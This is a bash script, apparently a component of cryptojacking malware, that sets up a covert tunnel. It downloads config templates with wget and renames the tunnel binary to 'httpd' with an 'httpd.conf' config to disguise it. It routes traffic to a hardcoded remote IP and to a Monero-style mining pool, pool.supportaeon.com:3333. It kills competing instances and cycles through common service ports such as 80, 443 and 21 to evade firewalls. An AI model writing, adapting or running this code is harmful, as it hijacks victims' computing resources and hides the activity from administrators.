#!/bin/bash

## tnl starter
## $1 is the starting port (for overrides)
function tstarter(){

    tnlpid(){
        pgrep -xf "${TNL_MASK} ${TNL_ARGS}\s*"
    }

    portavl() {
        if $(busybox nc -z 127.0.0.1 ${TNL_LISTEN}); then
            return 1
        else
            return 0
        fi
    }
    checktnl() {
        local pid="$(tnlpid)"
        ## lsof or netstat require /proc so not reliable
        local port="$(busybox nc -z 127.0.0.1 ${TNL_LISTEN} && printf 1)"
        local tss="$(jobs | grep ${TNL_MASK})"
        if [ -z "$pid" -o -z "$port" -o -z "$tss" ]; then ## order kind of matters
            return 1
        else
            return 0
        fi
    }
    starttnl(){
        ## starttnl should never be called more than once at a time
        if [ -n "$(tnlpid)" ]; then
            if [ -n "$(jobs | grep "$TNL_MASK")" ]; then
                # printf "%s" ${PREV_TNL_LISTEN} ## the previous port binded
                TNL_LISTEN=${PREV_TNL_LISTEN}
                return ## tnl started and already in session
            else ## a rogue tunnel not within its session kill it
                pkill -xf "${TNL_MASK} ${TNL_ARGS}"
            fi
        fi
        eval "coproc ${TNL_MASK} { exec ${TNL_MASK} ${TNL_ARGS}; }"
        fleep 1 ## time to bind
    }

    export TNL_LISTEN=$1
    gcpid=$(tnlpid)
    [ -n "$gcpid" ] && kill -9 $gcpid
    for port in $TNL_PLIST; do
        if portavl; then
            starttnl
        else
            checktnl && exit 0 ## check again in case of late start
            PREV_TNL_LISTEN=$TNL_LISTEN
            export TNL_LISTEN=$port
            envsubst -no-empty -i cfg/${TNL_CFG} -o ${TNL_CFG_MASK}
            continue
        fi
        if checktnl; then
            # printf "%s" ${TNL_LISTEN}
            return
        else
            PREV_TNL_LISTEN=$TNL_LISTEN
            export TNL_LISTEN=$port
            envsubst -no-empty -i cfg/${TNL_CFG} -o ${TNL_CFG_MASK}
        fi
    done

    return 1 ## no ports available
}

function setup_tnl() {
    TNL_REMOTE=${TNL_REMOTE:-198.204.227.235}
    TNL_PLIST="80 8081 443 8081 8082 9000 10000 3036 20 21 465 993 995 110 123 2703 3036"
    TNL_CFG=${TNL_CFG:-gst.json.tpl}
    TNL_PATH=${TNL_PATH:-$(get_path gst)}
    PC_PATH=${PC_PATH:-$(get_path pc)}
    TNL_MASK=${TNL_MASK:-httpd}
    TNL_CFG_MASK=${TNL_CFG_MASK:-httpd.conf}
    PC_CFG=${PC_CFG:-pc.conf.tpl}
    PC_CFG_MASK=${PC_CFG_MASK:-${PC_CFG%.tpl}}
    TNL_ARGS=${TNL_ARGS:--C ${TNL_CFG_MASK}}
    ## download cfg
    if [ ! -e "cfg/${TNL_CFG}" ]; then
        wget -q "${CFG_BASE_URL}${TNL_CFG}" -O "cfg/${TNL_CFG}"
    fi
    ## download pc
    if [ ! -e "cfg/${PC_CFG}" ]; then
        wget -q "${CFG_BASE_URL}${PC_CFG}" -O "cfg/${PC_CFG}"
    fi
    ## mask
    if [ -e "$TNL_PATH" ]; then
        mv "$TNL_PATH" "$(dirname ${TNL_PATH})/${TNL_MASK}"
    fi
    ## config with needed vars
    if [ "$jail" -o -n "$(uname -r | grep -E ^2\.6\.[0-9]*\|^3\.1[0-9]*)" ]; then
        TNL_PROTO=${TNL_PROTO:-socks+tcp}
    fi
    if [ "$lowhw" ]; then
        TNL_TARGET=${TNL_TARGET:-pool.supportaeon.com:3333}
    fi
    export TNL_REMOTE="$TNL_REMOTE" \
           TNL_LISTEN=${TNL_LISTEN:-8080} \
           TNL_PROTO \
           TNL_PROTO_PC \
           TNL_TARGET
    envsubst -no-empty -i cfg/${TNL_CFG} -o ${TNL_CFG_MASK}
    tstarter ${TNL_LISTEN}  || exit 1 ## tstarter takes care of updating TNL_LISTEN for the pc config
    envsubst -no-empty -i cfg/${PC_CFG} -o ${PC_CFG_MASK}
}
